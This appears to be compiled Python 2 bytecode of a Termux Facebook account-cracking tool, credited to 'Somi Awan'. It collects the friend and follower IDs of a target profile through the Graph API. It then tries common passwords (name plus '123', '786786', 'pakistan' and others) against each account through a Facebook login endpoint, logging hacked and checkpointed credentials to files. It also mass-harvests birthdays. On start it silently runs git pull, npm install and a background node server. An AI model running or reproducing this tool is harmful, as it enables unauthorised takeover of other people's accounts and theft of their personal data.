ó
£_`c           @   sh  y° d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l	 Z	 d  d l
 Z
 d  d l Z d  d l Z d  d l m Z Wn+ e k
 rÝ e  j d  e  j d  n Xe  j d  y e j d  Z WnJ e j j k
 rJd GHd GHd GHe j d	  e d
  e  j d  n Xe  j j d  sme  j d  n  d  d l m Z e  j d  e  j j d  síe  j d  e  j d  e  j d  e  j d  e  j d  e j d  nI e  j j d  r6e  j d  e  j d  e  j d  e  j d  n  e j d d  Z e j d d  Z i e e  d 6e e  d 6e e  d 6d d 6d  d! 6d" d# 6d$ d% 6d& d' 6Z e e  e j  d(  d) Z! d* Z" d+ Z# d, Z$ d-   Z% d.   Z& d/   Z' d0   Z( d1   Z) d2   Z* d3   Z+ d4   Z, d5   Z- d6   Z. d7   Z/ d8   Z0 d9   Z1 e2 d: k rde%   n  d S(;   iÿÿÿÿN(   t
   ThreadPools   pip2 install requestss   python2 index.xbnt   clears&   https://muhammadhamza365.byethost7.comt    s.   	    [1;31mTurn on mobile data OR wifi[0;97mi   s    Press enter to try again s   python2 primium.pys(   /data/data/com.termux/files/usr/bin/nodes#   apt update && apt install nodejs -y(   t   ConnectionErrors   git pullsJ   /data/data/com.termux/files/home//Premium...../node_modules/bytes/index.jss   fuser -k 5000/tcp &t   #s   cd ..... && npm installs   cd ..... && node index.js &i
   sJ   /data/data/com.termux/files/home/Premium/...../node_modules/bytes/index.jsg    ÐsAg    8|Ag     Ó@g     ã@s   x-fb-connection-bandwidths   x-fb-sim-hnis   x-fb-net-hnit	   EXCELLENTs   x-fb-connection-qualitys!   cell.CTRadioAccessTechnologyHSDPAs   x-fb-connection-typesl   Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36s
   user-agents!   application/x-www-form-urlencodeds   content-typet   Ligers   x-fb-http-engines   utf-8s   [1;32ms   [0;97ms   [1;31ms.  
       [1;91m_____    ____      __  __   _____ 
     [1;91m / ____|  / __ \    |  \/  | |_   _|
    [1;92m | (___   | |  | |   | \  / |   | |  
    [1;92m  \___ \  | |  | |   | |\/| |   | |  
    [1;95m  ____) | | |__| |   | |  | |  _| |_ 
    [1;95m |_____/   \____/    |_|  |_| |_____| [1;92mv 3.3.9
[1;95mâââââââââââââââââââââââââââââââââââââââââââââââ
[1;95m{[1;96m*[1;95m} [1;93mAuthor [1;91m: [1;96mSomi Awan
[1;95m{[1;96m*[1;95m} [1;93mFacebook [1;91m: [1;96mSomi Awan
[1;95m{[1;96m*[1;95m} [1;93mWhatsAp [1;91m: [1;96m03455453538
[1;95mâââââââââââââââââââââââââââââââââââââââââââââââ[1;0m
c           C   sG   t  j d  t GHd GHd t d t GHd GHd GHd GHd GHt   d  S(   NR   R   s   	    s   [1;93mFB Login Menus"   [1;93m--(1)--> [1;97mToken logins%   [1;93m--(2)--> [1;97m*ID/Pass login(   t   ost   systemt   logot   ct   c2t   login_select(    (    (    s   /sdcard/Primium.pyt   login<   s    c          C   sP  t  d  }  |  d k rt j d  t GHd GHd GHd GHt  d  } t d d  } | j |  | j   yl t j d	 |  } t	 j
 | j  } | d
 } | j d  d } d GHd | d GHt j d  t   WqLt t f k
 rd GHd GHd GHt  d  t   qLXn8 |  d k r*t   n" d GHd t d t GHd GHt   d  S(   Ns    [1;33mm--(Select)--> t   1R   R   s!   	    [1;36mFB Token Login[0;97ms    [1;91m--{Paste Your Token}-->s   .fb_token.txtt   ws+   https://graph.facebook.com/me?access_token=t   namet    i    s   	[1;32mToken logged in as : s   [0;97mi   s"   	    [1;31mToken not valid[0;97ms    Press enter to try again t   2s   	    s   Select valid method(   t	   raw_inputR   R   R	   t   opent   writet   closet   requestst   gett   jsont   loadst   textt   rsplitt   timet   sleept   method_menut   KeyErrort   IOErrorR   t   login_fbR
   R   R   (   t   afzat   tokent   token_st   rt   qR   t   nm(    (    s   /sdcard/Primium.pyR   G   s@    



c          C   su  t  j d  t GHd GHd GHd GHt d  }  |  j d d  } | j d d  } | j d d  } t d  } d GHt j d	 | d
 | d t j } t	 j
 |  } d | k rt d d  } | j | d  | j   t j d | d  t j d  d GHt j d  t   nV d | d k rVd GHd GHt j d  t d  t   n d GHd GHt d  t   d  S(   NR   R   s#   	    [1;36mFB ID/PASS Login[0;97ms    ID/Mail/Num : R   t   (t   )s    Password   : s   http://localhost:5000/auth?id=s   &pass=t   headerst   locs   .fb_token.txtR   sG   https://graph.facebook.com/me/friends?uid=100048514350891&access_token=i   s)   	    [1;32mLogged in successfully[0;97ms   www.facebook.comt   errors8   	    [1;31mUser must verify account before login[0;97ms    Press enter to try again s.   	[1;31mID/Number/Password may be wrong[0;97m(   R   R   R	   R   t   replaceR   R   t   headerR   R   R   R   R   R   t   postR   R   R   R"   (   t   idt   id1t   id2t   uidt   pwdt   dataR'   t   brand(    (    s   /sdcard/Primium.pyR"   i   s@    $




c          C   s  t  j d  t GHy t d d  j   a Wn t t f k
 rK t   n XyL t	 j
 d t  }  t j |  j  } | d } | j d  d } | } Wn t t f k
 rí d GHd	 t d
 t GHd GHt  j d  t j d  t   nI t	 j j k
 r5t GHd GHd GHd GHt j d  t d  t   n Xt  j d  t GHd GHd t d | t GHd GHd d GHd GHd GHd GHd GHd GHd GHt   d  S(   NR   s   .fb_token.txtR&   s+   https://graph.facebook.com/me?access_token=R   R   i    R   s   	    s   ID has checkpoints   rm -rf .fb_token.txti   s/   	    [1;31mTurn on mobile data OR wifi [0;97ms!    Press enter to try again [0;97ms   	  s   Logged In Useri/   t   _s3   [1;93m--{1}-->[1;97m Crack from public id/Friendss!   [1;93m--{2}-->[1;97m View tokens)   [1;93m--{3}-->[1;97m Return method menus   [1;93m--{4}-->[1;91m Logout(   R   R   R	   R   t   readR$   R    R!   R   R   R   R   R   R   R   R
   R   R   R   t
   exceptionsR   R   t   b_menut   b_menu_select(   R&   R'   R(   t   nmft   ok(    (    s   /sdcard/Primium.pyR;      sP    



	c             sá  t  d  }  g  } g   g    |  d k rPt j d  t GHd GHd GHd GHt  d  } y> t j d | d t  } t j | j	  } d	 | d
 GHWn7 t
 t f k
 rÎ d GHd GHd GHt  d  t   n Xt j d | d t  } t j | j	  } x| d D]B } | d } | d
 } | j d  d }	 | j | d |	  qWn·|  d k rt j d  t GHd GHd GHt  d  } yD t j d | d t d t } t j | j	  } d	 | d
 GHWn7 t
 t f k
 rd GHd GHd GHt  d  t   n Xt j d | d t d d t } t j | j	  } xË | d D]B } | d } | d
 } | j d  d }	 | j | d |	  qDWnz |  d k r£t   nd |  d k r¹t   nN |  d k rÏt   n8 |  d k råt   n" d GHd t d t GHd GHt   d d GHd  t t |   GHt j d!  d" GHd GHd d GHd GH   f d#   }
 t d$  } | j |
 |  d GHd d GHd GHd% GHd& t t     d' t t    GHd GHd d GHd GHt  d(  t   d  S()   Ns   
[1;33m--(Select)--> R   R   R   s-   	---{[1;96mPublic Account cloning[1;97m}---s   --{Input id/link}-->   s   https://graph.facebook.com/s   ?access_token=s    Cloning from : R   s0   
	    [1;31m Logged in id has checkpoint[0;97ms   
Press enter to back s   /friends?access_token=R6   R1   R   i    t   |t   222s   COMMING S0ON JUST WAIT R+   s   /subscribers?access_token=s   &limit=5000R   t   55t   3t   4s   	    s   Select valid methodi/   s   â¢s    Total id Account : g      à?s6     [1;93mUse Airplane Mode If There Is No Result[1;0mc            sR  |  } | j  d  \ } } y)| d } t j d | d | d d t j } t j |  } d | d k rÂ d	 | d
 | GHt d d  } | j | d
 | d  | j	     j
 |  nd | k r%d | d
 | d GHt d d  } | j | d
 | d  | j	    j
 |  n| d }	 t j d | d |	 d d t j } t j |  } d | d k rÉd	 | d
 |	 GHt d d  } | j | d
 |	 d  | j	     j
 |  nzd | k r,d | d
 |	 d GHt d d  } | j | d
 |	 d  | j	    j
 |  n| d }
 t j d | d |
 d d t j } t j |  } d | d k rÐd	 | d
 |
 GHt d d  } | j | d
 |
 d  | j	     j
 |  nsd | k r3d | d
 |
 d GHt d d  } | j | d
 |
 d  | j	    j
 |  n| d } t j d | d | d d t j } t j |  } d | d k r×d	 | d
 | GHt d d  } | j | d
 | d  | j	     j
 |  nld | k r:d | d
 | d GHt d d  } | j | d
 | d  | j	    j
 |  n	d } t j d | d | d d t j } t j |  } d | d k rÚd	 | d
 | GHt d d  } | j | d
 | d  | j	     j
 |  nid | k r=d | d
 | d GHt d d  } | j | d
 | d  | j	    j
 |  nd } t j d | d | d d t j } t j |  } d | d k rÝd	 | d
 | GHt d d  } | j | d
 | d  | j	     j
 |  nfd | k r@d | d
 | d GHt d d  } | j | d
 | d  | j	    j
 |  nd } t j d | d | d d t j } t j |  } d | d k ràd	 | d
 | GHt d d  } | j | d
 | d  | j	     j
 |  nc d | k rCd | d
 | d GHt d d  } | j | d
 | d  | j	    j
 |  n  Wn n Xd  S(   NR?   t   123s   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=vi_vn&password=sH   &sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705cR+   s   www.facebook.comt	   error_msgs   --{Error-Cp}-> s    | s   cp.txtt   as   
t   access_tokens#   [1;93m--{Hack[1;92med}--> [1;30ms   [1;0ms   ok.txtt   1234t   12345s$    [1;93m--{Hack[1;92med}--> [1;30mt   786t   786786t   000786t   pakistans#   [1;93m--{Hack[1;32med}--> [1;30m(   t   splitR   R   R/   R   R   R   R   R   R   t   append(   t   argt   userR4   R   t   pass1R'   t   dt   cpR>   t   pass2t   pass3t   pass4t   pass5t   pass6t   pass7(   t   cpst   oks(    s   /sdcard/Primium.pyt   main   sÜ    
(


(


(


(

(

(

(

i   s    Process has completed---> s    Total --{Cp}--{Ok}-->  s   <=>s    [1;92mEnter Go Back (   R   R   R   R	   R   R   R$   R   R   R   R    R!   R;   R   RO   R/   t
   view_tokent   extract_dobR   t   logoutR
   R   R<   t   strt   lenR   R   R    t   map(   t   selectR1   t   idtR&   R'   t   zt   iR4   t   naR(   R]   t   p(    (   R[   R\   s   /sdcard/Primium.pyR<   ¶   s¦    


!
%





		~	)	
c           C   sM   t  j d  t GHd GHd GHd GHd GHt  j d  d GHt d  t   d  S(   NR   R   s#   	    [1;32mLogged In Token [0;97ms	    Token : s   cat .fb_token.txts    Press enter to main menu (   R   R   R	   R   R;   (    (    (    s   /sdcard/Primium.pyR^     s    
c           C   sO   t  j d  t GHd GHd t d t GHd GHt d  t  j d  t   d  S(   NR   R   s   	    s   Logout Menus     Do you really want to logout ? s   rm -rf .fb_token.txt(   R   R   R	   R
   R   R   R   (    (    (    s   /sdcard/Primium.pyR`     s    
c           C   s   y t  d d  j   a Wn+ t t f k
 rF t j d  t   n Xt j	 d  t
 GHd GHd t d t GHd GHd GHd	 GHd
 GHd GHd GHt   d  S(   Ns   .fb_token.txtR&   i   R   R   s   	    s   Extract DOB Of IDs   [1] Grab from friendlists   [2] Grab from followerss   [3] Grab single ids   [4] Back(   R   R9   R$   R    R!   R   R   R   R   R   R	   R
   R   t
   dob_select(    (    (    s   /sdcard/Primium.pyR_     s     c             sz  t  d  }  g  } g    |  d k rTt j d  t GHd GHd GHd GHt  d  } yD t j d | d t d	 t } t j	 | j
  } d
 | d GHWn5 t k
 rÌ d GHd t GHd GHt  d  t   n Xt j d | d t d	 t } t j	 | j
  } xÅ| d D]B } | d } | d } | j d  d }	 | j | d |	  qWnt|  d k rt j d  t GHd GHd GHd GHt  d  } yD t j d | d t d	 t } t j	 | j
  } d | d GHWn' t k
 rúd GHt  d  t   n Xt j d | d t d d	 t } t j	 | j
  } x | d D]B } | d } | d } | j d  d }	 | j | d |	  q=WnB |  d k rt   n, |  d k r²t   n d GHd GHd GHt   d t t |   GHd GHd GHd GHd  d! GHd GH  f d"   }
 t d#  } | j |
 |  d GHd  d! GHd GHd$ GHd% t t     GHd GHd  d! GHd GHt  d&  t   d  S('   Ns   
 Choose Option >>> R   R   R   s+   	    [1;32mGrab DOB From Friendlist[0;97ms    Put Id/user : s   https://graph.facebook.com/s   ?access_token=R+   s    Target Id : R   s   [1;31mID Not Founds   
Press enter to back s   /friends?access_token=R6   R1   R   i    R?   R   s&   [1;32m Grab DOB From Followers[0;97ms    Cloning from : s   	    [1;31mID Not Found[0;97ms   /subscribers?access_token=s   &limit=5000RB   RC   s&   	    [1;31mSelect valid option[0;97ms    Total IDs : s    The Process has starteds     Note : This is for testing onlyi/   t   -c            sÎ   |  } | j  d  \ } } y¥ t j d | d t d t j } t j |  } | d } d | d | d | d	 GHt d
 d  } | j	 | d | d | d  | j
     j t  Wn n Xd  S(   NR?   s   https://graph.facebook.com/s   ?access_token=R+   t   birthdays   [1;32m s	    [1;30m s    | s   [0;97ms   dobs.txtRF   s   
(   RN   R   R   R$   R/   R   R   R   R   R   R   RO   t   number(   RP   RQ   R4   R   R'   RS   t   yt   nmb(   t   nms(    s   /sdcard/Primium.pyR]   ó  s    $
!
i   s    Process has completeds    Total DOB :  s   
 Press enter to back (   R   R   R   R	   R   R   R$   R/   R   R   R   R    R   Rj   R   RO   t   dobR;   Ra   Rb   R    Rc   R_   (   Rd   R1   Re   R&   R'   Rf   Rg   R4   Rh   R(   R]   Ri   (    (   Rp   s   /sdcard/Primium.pyRj   °  s    !	
!

!
%



			
c          C   s±  y t  d d  j   a Wn+ t t f k
 rF t j d  t   n Xt j	 d  t
 GHd GHd t d t GHd GHt d  }  t j	 d  t
 GHd GHt j	 d	  t j d  yA t j d
 |  d t d t j } t j |  } | d } Wn_ t t f k
 rSt j	 d  t
 GHd GHd t d t GHd GHd GHd GHt d  t   n Xt j	 d  t
 GHd GHd t d t GHd GHd |  GHd | GHd GHd d GHd GHt   d  S(   Ns   .fb_token.txtR&   i   R   R   s   	    s   Find DOB Of IDs    Put id/user : s$   echo -e "	   Finding DOB  " | lolcats   https://graph.facebook.com/s   ?access_token=R+   Rl   s    DOB not founds    Press enter to try again s    Account ID : s    DOB : i/   Rk   (   R   R9   R$   R    R!   R   R   R   R   R   R	   R
   R   R   R   R   R/   R   R   R   R_   t   conf(   Re   R&   Rf   t   dobs(    (    s   /sdcard/Primium.pyRq     sR    $
			c          C   sC   t  d  }  |  d k r" t   n |  d k r8 t   n t   d  S(   Ns!    Do you want to find again (y/n) Rn   t   n(   R   Rq   R_   R;   (   t   ol(    (    s   /sdcard/Primium.pyRr   :  s    

c          C   s§  t  j d  t GHy t d d  j   a Wn t t f k
 rK t   n XyL t	 j
 d t  }  t j |  j  } | d } | j d  d } | } Wn t t f k
 rí d GHd	 t d
 t GHd GHt  j d  t j d  t   nI t	 j j k
 r5t GHd GHd GHd GHt j d  t d  t   n Xt  j d  t GHd GHd d GHd GHd t d | t GHd GHd d GHd GHd GHd GHd GHd GHd GHt   d  S(   NR   s   .fb_token.txtR&   s+   https://graph.facebook.com/me?access_token=R   R   i    R   s   	    s   ID has checkpoints   rm -rf .fb_token.txti   s.   	    [1;31mTurn on mobile data OR wifi[0;97ms    Press enter to try again i/   Rk   s   	  s   Logged In Users   [1] Crack from public ids   [2] Crack from followerss   [3] Return method menus
   [4] Logout(   R   R   R	   R   R9   R$   R    R!   R   R   R   R   R   R   R   R
   R   R   R   R:   R   R   R;   t   l_menu_select(   R&   R'   R(   R=   R>   (    (    s   /sdcard/Primium.pyt   l_menuB  sT    



		c             s±  t  d  }  g  } g   g    |  d k rPt j d  t GHd GHd GHd GHt  d  } y> t j d | d t  } t j | j	  } d	 | d
 GHWn7 t
 t f k
 rÎ d GHd GHd GHt  d  t   n Xt j d | d t  } t j | j	  } xá| d D]B } | d } | d
 } | j d  d }	 | j | d |	  qWn|  d k rt j d  t GHd GHd GHd GHt  d  } yD t j d | d t d t } t j | j	  } d	 | d
 GHWn7 t
 t f k
 rd GHd GHd GHt  d  t   n Xt j d | d t d d t } t j | j	  } x | d D]B } | d } | d
 } | j d  d }	 | j | d |	  qIWnN |  d k r¨t   n8 |  d k r¾t   n" d GHd t d t GHd GHt   d t t |   GHt j d  d  GHd GHd! d" GHd GH   f d#   }
 t d$  } | j |
 |  d GHd! d" GHd GHd% GHd& t t    d' t t     GHd GHd! d" GHd GHt  d(  t   d  S()   Ns   
 [1;33mSelect option:  R   R   R   s   	 Public id clonings    Input id:  s   https://graph.facebook.com/s   ?access_token=s    Cloning from : R   s0   
	    [1;31m Logged in id has checkpoint[0;97ms   
Press enter to back s   /friends?access_token=R6   R1   R   i    R?   R   s   	 FollowerS Crackings    input id: R+   s   
 Press enter to back s   /subscribers?access_token=s   &limit=5000RB   RC   s   	    s   Select valid methods    Total IDs : g      à?s%    The process is running in backgroundi/   Rk   c            sh  |  } | j  d  \ } } y?| d } t j d | d | d t j } t j |  } d | k rÂ d | d | d	 GHt d
 d  } | j | d | d  | j	    j
 | |  nd | d k r)d | d | GHt d d  } | j | d | d  | j	     j
 | |  n0| d }	 t j d | d |	 d t j } t j |  } d | k rÍd | d |	 d	 GHt d
 d  } | j | d |	 d  | j	    j
 | |	  nd | d k r4d | d |	 GHt d d  } | j | d |	 d  | j	     j
 | |	  n%| d }
 t j d | d |
 d t j } t j |  } d | k rØd | d |
 d	 GHt d
 d  } | j | d |
 d  | j	    j
 | |
  nd | d k r?d | d |
 GHt d d  } | j | d |
 d  | j	     j
 | |
  n| d } t j d | d | d t j } t j |  } d | k rãd | d | d	 GHt d
 d  } | j | d | d  | j	    j
 | |  nvd | d k rJd | d | GHt d d  } | j | d | d  | j	     j | |  nd } t j d | d | d t j } t j |  } d | k rêd | d | d	 GHt d
 d  } | j | d | d  | j	    j
 | |  nod | d k rQd | d | GHt d d  } | j | d | d  | j	     j
 | |  nd } t j d | d |  j } t j |  } d | k rëd | d | d	 GHt d
 d  } | j | d | d  | j	    j
 | |  nnd | d k rRd | d | GHt d d  } | j | d | d  | j	     j
 | |  nd } t j d | d | d t j } t j |  } d | k ròd | d | d	 GHt d
 d  } | j | d | d  | j	    j
 | |  ng d | d k rYd | d | GHt d d  } | j | d | d  | j	     j
 | |  n  Wn n Xd  S(   NR?   RD   s   http://localhost:5000/auth?id=s   &pass=R+   R,   s   [1;32m[Successful] [1;30ms    | s   [0;97ms   ok.txtRF   s   
s   www.facebook.comR-   s   [Checkpoint] s   cp.txtRH   RI   RJ   RK   t   786000t   Pakistan(   RN   R   R   R/   R   R   R   R   R   R   RO   t   apppend(   RP   RQ   R4   R   RR   R6   R'   R>   RT   RU   RV   RW   RX   RY   RZ   (   R[   R\   (    s   /sdcard/Primium.pyR]   ²  sÜ    
$


$


$


$

$



$

i   s    The process has completeds    Total Ok/Cp :t   /s    Press entet to back (   R   R   R   R	   R   R   R$   R   R   R   R    R!   Rw   R   RO   R/   R   R`   R
   R   Rv   Ra   Rb   R   R   R    Rc   (   Rd   R1   Re   R&   R'   Rf   Rg   R4   Rh   R(   R]   Ri   (    (   R[   R\   s   /sdcard/Primium.pyRv   n  s    


!
%



	~	)	
t   __main__(3   R   t   sysR   t   datetimet   ret   randomt   hashlibt	   threadingR   t   getpasst   urllibt	   cookielibR   t   multiprocessing.poolR    t   ImportErrorR   R   t   myR:   R   R   R   t   patht   isfilet   requests.exceptionst   randintt   bdt   simt   reprR/   t   reloadt   setdefaultencodingR
   R   t   c3R	   R   R   R"   R;   R<   R^   R`   R_   Rj   Rq   Rr   Rw   Rv   t   __name__(    (    (    s   /sdcard/Primium.pyt   <module>   sn   
P
		"	"	+	Ô					_	+		,	Î


	-